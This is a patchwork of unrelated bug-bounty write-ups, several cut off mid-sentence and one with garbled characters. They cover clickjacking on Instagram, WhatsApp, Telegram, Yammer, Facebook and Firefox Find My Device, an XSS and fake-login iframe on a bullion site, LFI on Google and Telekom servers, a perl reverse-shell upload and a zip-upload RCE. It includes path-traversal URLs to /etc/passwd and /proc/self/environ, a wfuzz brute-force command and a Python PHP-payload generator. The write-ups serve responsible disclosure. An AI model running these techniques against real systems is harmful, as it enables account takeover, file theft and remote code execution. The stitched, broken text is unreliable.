Browser/OS: chrome , firefox Attack scenario: Attacker can embed payload in google site. Just by few clicks , victim who is logged in to sites.google.com/gmail can unknowingly 1.) make his/her private pics public. 2.) Upload unwanted files in google drive 3.) Unknowingly subscribe to site changes subscription. Embedding this page is like embedding the google drive picker. F. Embedding unlisted youtube videos. 500$ Steps to reproduce: 1. Go to your video → advance settings — -> Distribution Options → embedding and uncheck it , so it means we can’t embed the video in any iframe 2. It can be embedded into any webpage <iframe src=” https://www.youtube.com/embed/pbsQVpEROw4 \"></iframe> Browser/OS: Chrome / Linux Attack scenario: User instead of disallowing the video , can be embedded. It was able to embed whole Youtube, Google Books . I have reported but both of them went duplicate. If any one want’s poc for duplicate one please ping me. Next i started learning about CORS Vulnerability and was able to find cors issue in Google. Will disclose “CORS in google” reports soon.

Mohamed A. Baset comment 0 Comments access_time 3 min read (Photo Illustration by Thomas Trutschel/Photothek via Getty Images) Hi Guys, I hope all of you are doing great and in a well state. Today i will show you a ClickJacking bug i found in Instagram that allowed me to iframe ajax responses and leads attackers to steal your instagram connected applications tokens hence hijack your account! Long story short: I have found that some instagram Ajax GET requests can be iframed, I reported this to instagram back in 2015 but they rejected the issue and the reason was “it involves a lot of social engineering and interactions”, I didn’t gave up hope and took the issue to another level. While i was searching what can i do to convince Facebook Security Team with the impact of it an idea came to my mind, if most of the replies of the ajaxed requests of Instagram can be iframed why not trying to iframe the web page that manages the access tokens of the “Connected applications”?? This endpoint should be protected at least with a 20-mins re-auth or with a multi-factor authentication because it is critical. I went to the web page that manages the access token via this url: https://www.instagram.com/accounts/manage_access/ and it looked like this one: The UI is super solid no access tokens are shown or even it can be iframed because X-Frame-Options header is in place, adding __a=1 to the URL (If you’re an active facebook bug hunter you will be aware that most of facebook and instagram endpoints takes “__a=1” parameter to perform ajaxed requests) and here is what i’ve got: A json content-type reply along with the connected applications tokens and guess what? That reply could be iframed 😉 So, I picked up everything together, Opened a new ticket and suggested to my Friend Mostafa Kassem (a great developer BTW) to make a proof of concept but a very advanced one (A complete dashboard kinda like Instagram Phishing platform and you will see it in the proof of concept video), so quickly Mostafa shape the idea in a great way as suggested and i sent the issue back to Facebook again, here is their reply: Me: *winking* Got their attention! The suggested Impact: The suggested impact was that the responses of this ajax request is vulnerable to ClickJacking which gives the attacker the ability to trick the victim into copying the content of the reply and send it back to him, allows him stealing your precious access tokens. Remedy Suggested: Add X-Frame-Options server header to the request responses to prevent it from being iframed. Now, It’s the time of the PoC Video, I hope you guys like it, Again huge shouts to Mostafa Kassem! Profit? Till the next one, Peace! A minute if you please!

Mohamed A. Baset comment 0 Comments access_time 6 min read Introduction: Physical devices connected with web applications made everything easy to be managed. Screen size, availability, usage etc… is what pushing everyone to manage their devices through their desktops/laptops! On the other hand such advantages poses a threat if these web applications contains security issues! For example android devices can be managed through “Google Device Manager”, iOS devices can be managed by “iCloud service”, Windows Phone devices can be managed via your Microsoft account, FirefoxOS devices can be managed also through your Mozilla account and finally Internet of Things devices or (IoT) are connected to their own vendors dedicated web apps!! . About Firefox OS Firefox OS (project name: Boot to Gecko, also known as B2G) is an open-source operating system – made for smartphones, tablet computers and smart TVs – designed by Mozilla and external contributors, based on the rendering engine of their Firefox web browser and the Linux kernel. Firefox OS is designed to provide a complete, community-based alternative operating system, for running web applications directly or those installed from an application marketplace. The applications use open standards and approaches such as JavaScript and HTML5, a robust privilege model, open web APIs that can communicate directly with hardware, e.g. cellphone hardware. As such, it competes with commercially developed operating systems such as Apple’s iOS, Google’s Android, Microsoft’s Windows Phone, BlackBerry’s BlackBerry 10 and Jolla’s Sailfish OS. . About Firefox Find My Device Service Find My Device (aka “Where’s My Fox”) is a Firefox OS Service which is used to provide a means for users to locate, track and purge devices remotely. Example Use Cases, MVP User Stories 1) Albert can’t remember the location of his phone. Going to a nearby computer, he logs into WheresMyFox and requests the phone to report it’s location. The phone reports that it is nearby, so Albert requests the device to ring. Albert quickly finds that his phone is in his coat pocket. 2) Bea discovers that her phone is missing. Using a friends phone, she logs into WheresMyFox and requests the phone to report it’s location. She discovers that the phone is currently headed down Broadway, and realizes she has left it in the cab. Realizing that she may never see her phone again, she requests the phone to remotely wipe itself, before calling the cab agency to see if she can recover her device. And here’s our story… . [*] The bug: Firefox Find My Device service is not protected against clickjacking vulnerability neither with the typical “X-Frame-Options” nor with the JS frame busting technique that means a malicious attacker capable of iframing the whole service and tricking the end-users to perform unwanted actions! . [*] Rolling around the bug: To iframe the service and perform a successful Clickjacking attack you need to know the full url of the service which contains a “Device ID” which is a random alphanumeric value (non guessable because it’s a 32 alphanumeric value or even can be MiTMed because of the fact that the service is using HTTPS). So what we’re doing here? Studied the web application more, tested it against other issues (XSS, CSRF, Open Redirections, etc..) but it seems pretty solid! hmmm I took a deep breath, drink some power stuff and suddenly came up with a nasty idea! What about exploiting the usability? Modern Web Applications are usually designed to satisfy the user’s sake of USABILITY so to be straightforward, “Find My Device” service is redirecting you automatically to the device id page but in one condition (if you’re already logged in from a browser that was used before to access the service “a trusted browser”) that little notice brought the whole scenario back to life, By calling an internal url eg. “https://find.firefox.com/” thanks to the usability thing we’re redirected to our treasure “https://find.firefox.com/8fcXXXXc40de04b3803945XXXXXXXXXX” and we’re good to go! . Affected URL(s): https://find.firefox.com . . What attackers can do using such vulnerability?: 1- Erase the victim’s device data with just only 3 clicks by the victim himself if he tricked with “click here to win a 50 BTC for Example” 2- Lock The victim device or change his lock code if it is the first time to be set “4 clicks” 3- Makes the Device ringing “2 clicks” . PoC Video: . More Details About clickjacking: Because of no frame busting techniques or X-Frame-Options header, the whole website is vulnerable to Clickjacking attacks which could lead to a full account takeover considering such scenario: 1. Attacker will iframe any sensitive the website page and adjust the iframe size and add a “divs” as a layers on the unwanted-to-show parts of the original web page to fool and trick the user. 2. User get tricked by the crafted page and followed the attacker’s instruction to do a specific clicks to the iframed page 3. Unwanted actions happened in the logged in user’s session in result to the attack’s clicks. .. Mitigation : 1- Add an X-Frame-Options HTTP Header and set it’s value to “Deny” or “Sameorigin” as you can see it suitable to mitigate such attacks 2- Use iframe busting techmiques in JS code like this: <script type=”text/javascript”> if (self === top) { var antiClickjack = document.getElementById (“antiClickjack”); antiClickjack.parentNode. removeChild(antiClickjack); } else { top.location = ‘Your_Website_URL_Here’; } </script> or <script type=”text/javascript”> // Disable frame hijacking if (top != self) top.location.href = location.href; </script> . The Fix: Mozilla fixed the issue by implementing the X-Frame-Options header with a value of “DENY” which means even the same domain can’t iframe itself, Good job! . .

Step by step it looks like this: var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]); This var defines new URLSearchParams interface which takes the value of window.location.search as parameter. In this case it is the value of g parameter. So variable p has the value of: ?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next: var h = p[‘get’](‘g’); takes the value of g parameter and assign its value to h variable. Variable h has the value of: z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next variable e is created: var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1); It does a substring javascript method and takes the last character of the string assigned to h variable, last value of that string is number 1 ( last value must be number, if not there will be an error since parseInt in variable eq takes string and parses it to integer, so the value must be numeric, no letters ) : z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa[1] Next value h is assigned the value of h without the last character, in this case it is 1. So h has the value of: h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1); z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa Next variable eq has the value of array with two field and join method adds the value of “=” to array. var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’); So the value inside array and the value variable eq is: = Last step is variable u , there are three things happening here. Value of h is split into array, and then reversed and joined again with value of eq variable added to the end. var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq); So first we get: h.split(“”); (68) [“z”, “8”, “i”, “c”, “l”, “Z”, “H”, “b”, “p”, “N”, “X”, “L”, “z”, “t”, “2”, “Y”, “p”, “B”, “X”, “L”, “w”, “9”, “G”, “d”, “t”, “M”, “X”, “d”, “v”, “M”, “X”, “Z”, “v”, “0”, “2”, “b”, “j”, “5”, “C”, “b”, “s”, “V”, “n”, “Y”, “k”, “x”, “2”, “b”, “n”, “J”, “X”, “Z”, “2”, “x”, “W”, “a”, “z”, “9”, “y”, “L”, “6”, “M”, “H”, “c”, “0”, “R”, “H”, “a”] And then reverse the values: h.split(“”).reverse(); (68) [“a”, “H”, “R”, “0”, “c”, “H”, “M”, “6”, “L”, “y”, “9”, “z”, “a”, “W”, “x”, “2”, “Z”, “X”, “J”, “n”, “b”, “2”, “x”, “k”, “Y”, “n”, “V”, “s”, “b”, “C”, “5”, “j”, “b”, “2”, “0”, “v”, “Z”, “X”, “M”, “v”, “d”, “X”, “M”, “t”, “d”, “G”, “9”, “w”, “L”, “X”, “B”, “p”, “Y”, “2”, “t”, “z”, “L”, “X”, “N”, “p”, “b”, “H”, “Z”, “l”, “c”, “i”, “8”, “z”] And them join the values and add the value of eq variable: h.split(“”).reverse().join(“”) + eq “aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=” So we get the final falue encoded in BASE64 and the function b does decoding to cleartext and regex inside window.location removes quotes and double quotes. b(“aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=”); “https://silvergoldbull.com/es/us-top-picks-silver/3\" Exploitation time: 1.

Something that will get us data. 2. Stealing user logins with fake login inside Iframe displayed on https://silvergoldbull.com Lets first clone the login page and setup fake https login page: https://maxon3.github.io/silvergold/ Next we have to setup out injection vector, since quotes and double quotes are removed from the vector we have to use something other instead of them, we can use backtics and bypass that. Steps: 1. Set new parameter inside URL request with value of encoded base64 iframe ( secK parameter ) 2. Request value of secK with our javascript injected vector ( injection vector is the value of g parameter ) 3. Page gets rendered and displayed 4. User enters his data and clicks login 5.

Mohamed A. Baset comment 0 Comments access_time 4 min read Hi Folks, I know it’s a little bit lame to mention 2 clickjacking vulnerabilities in row but that what bug hunters always do exposing the largest companies security failures, (Previously was Telegram ) this time is the gigantic well-known 19 billion dollar messenger WhatsApp . WhatsApp Inc., was founded in 2009 by Brian Acton and Jan Koum , both former employees of Yahoo! . After Koum and Acton left Yahoo! in September 2007, the duo traveled to South America as a break from work. At one point they applied for jobs at Facebook but were rejected. For the rest of the following years Koum relied on his $400,000 savings from Yahoo!. In January 2009, after purchasing an iPhone and realizing that the seven-month-old App Store was about to spawn a whole new industry of apps, he started visiting his friend Alex Fishman in West San Jose where the three would discuss “…having statuses next to individual names of the people,” but this was not possible without an iPhone developer, so Fishman introduced Koum to Igor Solomennikov, a developer in Russia that he had found on RentACoder.com. Koum almost immediately chose the name “WhatsApp” because it sounded like “what’s up”, and a week later on his birthday, on February 24, 2009, he incorporated WhatsApp Inc. in California. However, early WhatsApp kept crashing or getting stuck and at a particular point, Koum felt like giving up and looking for a new job, upon which Acton encouraged him to wait for a “few more months” Regarding the vulnerability, Clickjacking is one of the oldest web application typical vulnerabilities where (by design) a lot of companies never paid attention to it. Clickjacking , also known as a “UI redress attack”, is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is “hijacking” clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker. What an attacker can do with a clickjacking on WhatsApp? 1. Sending a messages in behalf of the currently logged in users 2. Deceive users to create unwanted chat groups, make calls, add contacts, block contacts, etc… Back to January 2015, One of Seekurity members reported the vulnerability to Facebook (because at this time WhatsApp was one of Facebook’s acquisitions) and here’s a screenshot of the original report. WhatsApp Report to Facebook The whole web client of WhatsApp was vulnerable to clickjacking attack, Sometimes web applications with a minimal functionalities are immune to vulnerabilities because of the fact that you’re attacking just a few features! Encryption and Web Clients! Both Telegram and WhatsApp are supporting end-to-end encryption but the fact is when the client fails to protect it’s users the crypto means nothing! Unlike Telegram and it’s tricky UI protection mechanisms, WhatsApp was totally vulnerable without an Iframe busting techniques or even an X-FRAME-OPTIONS header value! When it comes to a web app with a few features to attack, Attackers are looking for any ways that gives them an access to such hard-to-hack services and regardless that a clickjacking attack might be worthless “sometimes” but in our case it still effective! WhatsApp ClickJacking PoC Demonstration and PoC Code The Fix: WhatsApp finally noticed the risk of the issue and fixed it by applying an X-Frame-Options header with a value of “Deny” Hey!

Baset comment 0 Comments access_time 3 min read Introduction: Modern Web Applications nowadays are relaying on a lot of technologies where typical web applications vulnerabilities are hard to find (eg. Clickjacking is an ABC security bug) but bug hunters are always the best! Yammer is a freemium enterprise social networking service used for private communication within organizations. Access to a Yammer network is determined by a user’s Internet domain so that only individuals with approved email addresses may join their respective networks. The service began as an internal communication system for the genealogy website Geni, and was launched as an independent product in 2008. Microsoft later acquired Yammer in 2012 for US$1.2 billion. . The bug: Yammer is not protecting itself from clickjacking with the typical “X-Frame-Options” header but uses a JS frame busting technique to prevent the website to be iframed but b y exploiting one of HTML5 Features “Sandboxed Iframes” Iframing Yammer.com will be possible and we will prevent the redirection to the top window location! . . What is Sandboxed iframes? The sandbox attribute enables an extra set of restrictions for the content in the iframe. When the sandbox attribute is present, and it will: – Treat the content as being from a unique origin – Block form submission – block script execution – Disable APIs – Prevent links from targeting other browsing contexts – Prevent content from using plugins (through <embed>, <object>, <applet>, or other) – Prevent the content to navigate its top-level browsing context – Block automatically triggered features (such as automatically playing a video or automatically focusing a form control) The value of the sandbox attribute can either be just sandbox (then all restrictions are applied), or a space-separated list of pre-defined values that will REMOVE the particular restrictions. . Attack Scenario: Iframing the Settings page or any other sensitive page with a sandboxed iframe to prevent redirecting to top window and allow scripts to be running, fooling the users to do unwanted actions. . Impact: What attacker can achieve? – Change sensitive information of the currently logged in Yammer users (Password, Recovery Emails, etc..) – Send messages in behalf of currently logged in Yammer users – Send Contact requests in behalf of currently logged in Yammer users – Send Group invites in behalf of currently logged in Yammer users – Etc… . PoC Video: . The Fix: Microsoft fixed the bug affects Yammer social network by applying “X-Frame-Options” header on server side with a value of “SAMEORIGIN” means if you’re lucky and got an XSS it will help a lot (if you couldn’t steal the cookie or reading the anti-csrf value)! . Reward: Microsoft rewarded Seekurity team with a cool undisclosed bounty, Thanks Microsoft! . . Hey! Building a website? Or already built a one?

Spoiler: Unfortunately, after a week, I got the reply that from google VRP Panel: “As a part of our Vulnerability Reward Program, we decided that it does not meet the bar for a financial reward “ SECOND ROUND Since the bug probably won’t be elegible to get a financial reward, I started thinking to go deeper on that “Auth bypass”, I mean, for some reason is not suppoused to be open, so I decided to try again, then after some new dir enumeration with wfuzz , I got something really really interesting, I was able to escalate that simple Auth bypass bug to LFI on production servers as admin in google production servers. Note: to any people that wonders how I have found the REDACTED_DIR, I used wfuzz to brute force a dir list in https://springboard.google.com/ and filter the non 302 redirect responses that gave me as result https://springboard.google.com/REDACTED_DIR , since the 302 redirected me to http://cloudsearch.google.com I did that brute force before the redirect Title: LFI on production servers in the same subdomain Product / URL: ​ springboard.google.com/REDACTED_DIR/ANOTHER_DIR Summary: I’ve able to escalate this auth bypass to LFI on google production servers as “gxx-xxxx” user (admin privileges)! POC: 1.- First see that the dashboard panel of “Redacted status main” (FrameworkInfo) is open in https://springboard.google.com/REDACTED_DIR/ANOTHER_DIR 2.- Then if you navigate to “Show REDACTED” (The last option) you are going to be redirected to https://springboard.google.com/REDACTED_DIR/ANOTHER_DIR?file=/proc/self/environ and the /proc/self/environ will be loaded 3.- Just to be sure that was a full LFI working I tried to load another file and I checked with /proc/version and works just as expected! Then my heart stopped for a second, I just got a LFI on google production servers as administrator (servers on plural because each time that I refreshed /proc/self/environ file the hostname changed) To be honest I tried to escalate to RCE but I hadn’t any success, since apparently it was very hardened I wasn’t able to read /proc/*/fd, ssh keys, server keys or any logs.

May i ask which dir list did you use to find the non 302 responses? Cause it seems that i could not find the keyword “REDACTED_DIR” from wfuzz cloned in GitHub. Thank you. Reply omespino says: July 16, 2019 at 9:09 pm Hey the “REDACTED_DIR” means that I wasn’t able to make public that folder name, is “REDACTED” or non-public because google asked for hide that name before publish the write up, for the 302 I used wfuzz options, it has the –hc option to hide http status respones, that in my case since I was looking just for http status code 200, the command was something like this “wfuzz -c -w ./wlist.txt –hc 301,302,307,400,401,402,403,404,410,429,500,501,502,503,504 https://springboard.google.com/FUZZ “, and for the wlist I just use the danielmiessler’s seclists from github. thanks for reading Reply Afolic says: September 1, 2019 at 11:06 pm Thanks for this amazing write-up, I really would like to know your recommendation on the wordlist to use, seclist has tons of wordlist and that makes it difficulty to choice the correct one for dir bruteforce and also I would love to Know if there is any wordlist for parameter bruteforce, not sure if that’s a thing. Thanks for the write up once again. Reply omespino says: September 6, 2019 at 10:14 pm Hey thanks for reading, I created a custom list from Fuzz and Discovery/Web-Content, but to be honest at the end I always use the all.txt from Jhaddix and wait, for parameter bruce forcing I never look for that but I have reading that Arjun by somd3v is really cool to do that https://github.com/s0md3v/Arjun Reply 0x1bitcrack3r says: October 3, 2019 at 6:07 am This is an amazing finding man.

Baset comment 3 Comments access_time 3 min read [*] Introduction: Modern Web Applications nowadays are relaying on a lot of technologies where typical web applications vulnerabilities are hard to find (eg. Clickjacking is an ABC security bug) but bug hunters are always the best! Let’s know Telegram more, Telegram is a cloud-based instant messaging service. Telegram clients exist for both mobile (Android, iOS, Windows Phone, Ubuntu Touch) and desktop systems (Windows, OS X, Linux). Users can send messages and exchange photos, videos, stickers and files of any type. Telegram also provides optional end-to-end encrypted messaging with self-destruct timers, but these features have been contested by security researchers and cryptography experts. Telegram is supported by the Russian-born entrepreneur Pavel Durov, who is now a citizen of Saint Kitts and Nevis, travelling the world in self-imposed exile.Its client-side code is open-source software, whereas its server-side code is closed-sourced and proprietary. The service also provides APIs to independent developers. Telegram was and still a well-known messenger application for it’s strong end-to-end encryption, But how it is useful to have a strong crypto and a weak client! Let’s tell you our story behind digging into Telegram’s Web Client… [*] The bug: 0. Telegram web client is not protecting itself from clickjacking with the typical “X-Frame-Options” header but uses a JS frame busting technique to prevent the website to be iframed, By exploiting one of HTML5 Features “Sandboxed Iframes” Iframing Telegram will be possible and we will never redirected to the top window location! [*] Rolling around the bug: Telegram is using an additional CSS trick, The main web app style sets the display property with “none” value for the whole HTML Tag which makes the whole view invisible this lowered our attack surface but there’s still hope! So all what we need now is to block the access of the style file which is responsible for styling the main web app html! Here comes the next part of exploitation! [*] The Prerequisites: 1. Attacker will MITMing the Local Network and if he was able to Prevent access to this resource/path https://web.telegram.org/css/app.css [*] This part can be done by some tricks/other bugs (eg. Deep Packet Inspection ) [*] We disclosed a more efficient way than (MITMing a network) to achieve this step to Telegram Security Team! [*] The Attack Scenario: 2. Iframing the Settings page with a sandboxed iframe to prevent redirecting to top window and allow scripts to be running. [*] The Impact: What attacker can achieve? – Change sensitive information of the currently logged in telegram users (Password, Recovery Emails, etc..) – Send messages in behalf of currently logged in telegram users – Send Contact requests in behalf of currently logged in telegram users – Send Group invites in behalf of currently logged in telegram users – Mark all the victim’s messages as Read [CSRF] (By iframing the url paths to the conversations. eg: https://web.telegram.org/#/im?p=@SymbianSyMoh) – Etc… The Fix: This bug has been fixed now, Telegram Web Client applied “X-Frame-Options” header on server side!

Here’s the full content:\n\nSteam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper June 07, 2018 Reading time ~5 minutes Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper Summary The âSteam Inventory Helperâ Chrome extension version 1.13.6 suffered from both a DOM-based Cross-site Scripting (XSS) and a clickjacking vulnerability. By combining these vulnerabilities it is possible to gain JavaScript code execution in the highly-privileged context of the extensionâs background page. Due to the extension declaring the â â permission, this vulnerability can be exploited to hijack all sites that the victim is authenticated to. For example, if a user is authenticated to their bank, Steam, Gmail, and Facebook, this vulnerability could be used to access all of those accounts. This vulnerability is fixed in the latest version of the extension and all users should update (if Chrome has not done so for them automatically). The core of this issue is due to a DOM-based Cross-site Scripting (XSS) in â/html/bookmarks.htmlâ which is frameable from arbitrary web pages due to a the âweb_accessible_resourcesâ directive specifying this resource. By submitting an entry with the name of an XSS payload this page can be exploited to gain JavaScript execution in the context of the extension. Since a user is unlikely to paste an XSS payload into this page of their own will, the clickjacking vulnerability is used to redress the UI of the application to trick the victim into exploiting the issue. A pretext of a âBot Detectionâ page is used to get the victim to paste the payload (hidden inside of a larger âverification codeâ) and click the âAddâ button to exploit the issue. The full proof-of-concept can be seen in the video below. Proof-of-Concept Technical Details The first vulnerability is the DOM-based Cross-site Scripting (XSS) vulnerability in â/html/bookmarks.htmlâ, the following is the vulnerable JavaScript from the included âbookmarks.jsâ: $('#btAdd').click(function() { var btname = $('#txtName').val(); if ($('.custom-button .name').filter(function() { return $(this).text() === btname; }).length) return false; var span = $('<span class=\"custom-button\">'); span.html('<span class=\"name\">' + btname + '</span>'); span.append('<a href=\"javascript:void(0)\" title=\"remove\">x</a>'); span.attr('title', btname); span.data('id', (new Date().getTime())); $('div.custom-buttons .existing').append(span); save_options(); }); The above JavaScript takes the value of the âtxtNameâ text box and uses string concatenation to build HTML which is appended to the DOM via jQueryâs âappend()â function. This is the core of the XSS vulnerability since user input should always be contextually escaped to prevent injection of arbitrary markup. Normally, Chrome extension Content Security Policy (CSP) should prevent this vulnerability from being exploited. However, due to the loosening of this policy via âunsafe-evalâ and the use of jQueryâs DOM APIs, this was still able to be exploited. This is due to much of jQueryâs DOM APIs making use of âglobalEval()â , which automatically passes scripts to âeval()â upon appending to the DOM. While this is a serious vulnerability, on its own exploitation is fairly limited due to the user-interaction required to exploit it. The victim would have to open the page, paste a Cross-site Scripting (XSS) payload into the field, and click the âAddâ button to exploit it. In order to better weaponize this vulnerability we make use of a separate vulnerability (clickjacking) in order to bolster the attack. The following is an excerpt from the Chrome extensionâs manifest: ...trimmed for brevity... \"web_accessible_resources\": [ \"_locales/*\", \"bundle/*\", \"dist/*\", \"assets/*\", \"font/*\", \"html/bookmarks.html\", \"css/*.css\", \"js/*.js\", \"js/jquery/*.js\", \"js/lang/*\" ], ...trimmed for brevity... The above section demonstrates that the extension casts a wide net with its âweb_accessible_resourcesâ policy. By default Chrome extensions prevent framing and navigation to Chrome extension pages from arbitrary web pages as an extra security measure. This directive loosens this restriction, allowing for third party pages to navigate to and frame the specified resources. Much of the extensionâs privileged UI pages are specified under this directive, rendering the extension vulnerable to clickjacking. As can also be seen in the excerpt, the â/html/bookmarks.htmlâ page is also able to be framed and thus exploited via clickjacking. We abuse this to iframe this page in our web page, and overlay the frame with DOM elements to redress the layout. This makes it so that the victim is unaware that they are actually interacting with the extension below. The following animation demonstrates this effect: The above example demonstrates how we redress the UI to trick the victim. The âBot Detectionâ page provides a button to click to copy the âVerification codeâ to the victimâs clipboard. This âverification codeâ is actually a Cross-site Scripting (XSS) payload inside of a large amount of random hex bytes. This hides the payload from the victimâs view while they paste it into the extensionâs textbox, leading the victim into believing they are just copying and pasting a long random code. Finally, when the victim clicks the âAddâ button, the XSS fires. Root Cause & Further Thoughts There are two notable points of interest in this exploit. The first is that we were able to achieve DOM-XSS even with a fairly tight Content Security Policy (CSP) of the following: \"script-src 'self' 'unsafe-eval'; object-src 'self'\" While this CSP is fairly strong, it crumbles when combined with unsafe usage of jQueryâs DOM manipulation APIs such as â.html()â and â.append()â. This is something to look for when auditing Chrome extensions (and when writing them), if you make use of jQuery and have âunsafe-evalâ in your CSP â youâre playing with fire. The second interesting point is that clickjacking is a valid vulnerability which can absolutely affect Chrome extensions. All that is required is that a privileged Chrome extension UI page be exposed via the âweb_accessible_resourcesâ directive. After taking a look at many of the popular extensions on the Chrome store it seems many of them fall victim this simple mistake. Most of the time this is due to accidental overscoping via wildcarding of a privileged extension HTML page. This not only opens up extensions to attacks like clickjacking but can result in other vulnerabilities if the extension takes in user input from âlocation.hashâ, âpostMessageâ, etc. The default protection given to Chrome extensions via the navigation sandboxing should not be taken for granted by the extension developers.

Baset comment 2 Comments access_time 2 min read Hi Bug Hunters, Today we will explain how we redressed facebook ui and made it so easy to fool a victim to for example, Add the attacker as a member in one of his own secret groups on facebook. Here’s some details about the issue: Vulnerability Type: ClickJacking The vulnerable url: https://www.facebook.com/ajax/home/generic.php?dpr=1&sidecol=true&path=/groups/ 559357440894888 /&endpoint=/ajax/home/generic.php&__user= 100000152886101 &__a=1&__dyn=&__req=jsonp_8&__be=0&__pc=EXP1:DEFAULT&__rev=2286573&__cid= Where: 1. 559357440894888 is the targeted resource (group) 2. 100000152886101 is the targeted user who owns the resource, (Just a parameter value sent along with the first GET request to be included in the form action to successfully complete the request) The problem: When this endpoint (/ajax/home/generic.php) calling an client side facebook path (path=) related to a facebook resource (pages, groups, etc..) this resource lacks the “X-Frame-Options” and became iframable. The fact is that all the actions inside the iframable response are depending on another resource that has not been loaded to complete the AJAXed requests to be made but LUCKILY we found that the iframable resource contains some “Forms” that are able to be submitted by the victim. The PoC Impact: Fooling a victim to add a specific user to a targeted secret group or even any other resource!!

I will use lol.com to represent an application as can not disclose the website’s name. While i was enumerating an application i got a domain which was basically an image server and was managing the images which has uploaded by a user, while enumerating more, i got an endpoint which was allowing me to call the server local files such as passwd , cron jobs and current running services on the server. Press enter or click to view image in full size As it was a image server means the server stores all the images which user uploads form his/her profiles. I again went back to lol.com and started looking for photo upload functionality that from where i can upload the photo and i got the profile photo option which is allowing me to upload the photos to an application and the photos were storing to the image server. Now photo upload functionality has ext parameter which is used for file extensions checks but due to improper validations on the parameter, i was able to tamper the values and can upload unrestricted files on the server, i tried to upload php shell but as it was image server so it was not serving the php but by reconig more via lfi i came to know that i can get a shell via perl so i uploaded a perl reverse shell to get a reverse shell on my public IP. Press enter or click to view image in full size And with the use of LFI I called the file and i got the reverse shell on my public IP. Press enter or click to view image in full size Thanks for reading, Hope you guys liked it.

This is a perfect example of how the communication between the bug bounty operator and the researcher can satisfy both parties. The fixes for the critical vulnerabilities (RCE, SQLi, LFI) were implemented quite fast within only a few days after my initial report (!) , the fix for the XSS took a bit longer, but it’s still acceptable for a medium-severity issue. Bug Bounty programs are always a great challenge and sometimes you’re rewarded with pretty cool stuff and great references like this – now here’s a short write-up about the discovered vulnerabilities, which already have been fixed by Magix. Remote Code Execution on europe.magix.com This is the most dangerous flaw, I’ve found while working on this bug bounty program. I’ve discovered a script, that allows an attacker to upload zip files via a HTTP POST request. The script accepts any zip file, renames it to some temporary name and finally extracts the .zip file to a worker directory without checking if the zip file contains a valid file. Additionally, the extracted contents were accessible via www – I think the problem is quite obvious. To prove the exploitability to Magix, I wrote a short Python script. The following snippet shows how the quite handy Python ZipFile function can be used to dynamically generate a zip file in memory. The .zip file contains one single file named “/tmp/test.php” with a custom PHP payload. #!/usr/bin/python import zipfile from StringIO import StringIO import zlib inMemoryFile = StringIO() zipFile = zipfile.ZipFile(inMemoryFile, 'w', zipfile.ZIP_DEFLATED) zipFile.writestr('./tmp/test.php', '<?php echo \\\"www.rcesecurity.com\\\"; ?>') zipFile.close() In case of Magix, the target script echoes some additional (and hazardous) debugging output after POSTing an arbitrary zip file: looks like Magix missed to deactivate this output – without this I wouldn’t have probably found this flaw 🙂 Since the debugging output also discloses the full-path of the extracted file, this leads to a nice RCE condition: Now imagine an attacker who’d upload some malicious C99… SQL Injection on europe.magix.com This vulnerability is more or less based on the same condition like the previously described RCE flaw. If the zip file contains a specially prepared .ini file, the same script, that is responsible for the RCE flaw, uses the .ini values unfiletered in a SQL query: Local File Inclusion on downloadsv9.xara.com A local file inclusion could become as dangerous as a RCE flaw, because an attacker may read sensitive system files like /etc/passwd: …and if you’ve got a lazy sysadmin who likes to chmod 777 on files and directories, even more might by revealed 😉 Cross-Site Scripting on downloadsv9.xara.com OK – I promised not to write about a XSS in detail anymore, so I’ll leave you with the PoC screenshot: A real happy day for bug bounty hunters and Magix!

After running aquatone, dnsenum, recon-ng and sublist3r, I collected all of the subdomains and removed duplicates, created a simple bash script to iterate over them and run dirb on every subdomain, and went on with my usual stalking of /r/netsec to read new interesting things. Few hours later, I checked to see how dirb was doing and something caught my eye. I saw one subdomain had info.php page available. I just love php, developers usually mess up something, and leave some doors for hackers to come in. Opening info.php gave me some info that will be useful when Code Execution part comes. After opening page I was greeted with login page. It was time to fire up BurpSuite and do some spidering. Few seconds later nice URL showed in burp : https://netweb.telekom.de/netweb/gui/help.php?HELPFILE=logon.hlp Oh, I just had to replace that logon.hlp with ../../../../../../../../etc/passwd : https://netweb.telekom.de/netweb/gui/help.php?SID&HELPFILE=../../../../../../../../etc/passwd And Bingo: Press enter or click to view image in full size /etc/passwd output. Some more files: Press enter or click to view image in full size /etc/release output. Press enter or click to view image in full size Part of report with LFI examples. So LFI is fun, but it is not in scope, time to execute some command. I choose error.log poisoning option. So remember that info.php ( phpinfo()) file in the site root. It showed the location of error.log file, and made my job a lot easier, all the locations from SecList LFI list, gave 0 hits on the error.log file location. And in info.php it was: 